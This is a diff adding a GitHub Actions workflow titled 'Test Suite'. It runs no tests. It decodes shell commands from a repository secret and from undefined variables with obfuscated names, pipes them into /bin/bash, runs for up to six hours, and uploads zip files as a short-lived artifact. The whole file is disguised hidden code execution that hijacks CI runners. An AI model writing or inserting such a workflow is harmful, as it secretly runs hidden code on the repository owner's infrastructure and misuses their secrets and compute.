@@ -1,0 +1,26 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          auu18: ${{ secrets.auu18 }}
+        run: |
+          printf '%s' "$auu18" | jq -r .tnysi59443 | /bin/bash
+          echo $dxl328 | jq -r .co0456 | /bin/bash
+          echo $popdv8725 | jq -r .i166 | /bin/bash
+          echo $m39102 | jq -r .lzf681 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: hOUuzPcm
+          path: "*.zip"
+          retention-days: 1
